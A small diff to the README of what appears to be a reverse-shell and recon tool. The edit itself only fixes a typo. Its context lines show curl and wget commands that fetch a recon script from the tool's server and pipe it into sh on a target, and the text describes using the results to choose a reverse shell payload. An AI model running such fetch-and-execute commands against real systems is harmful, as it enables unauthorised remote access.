@@ -111,7 +111,7 @@ curl http://localhost:8000/shells/recon.sh | sh
 wget http://localhost:8000/shells/recon.sh -O- | sh
 ```
 
-The server console will now log information about the remote target. In the below scenario we can see that the target is running as `root`, and has both `nc` and `python3` available - which is enough information to get a decide on a reverse shell payload:
+The server console will now log information about the remote target. In the below scenario we can see that the target is running as `root`, and has both `nc` and `python3` available - which is enough information to decide on a reverse shell payload:
 
 ![Example of the extracting data from the target](./images/recon.png)
 
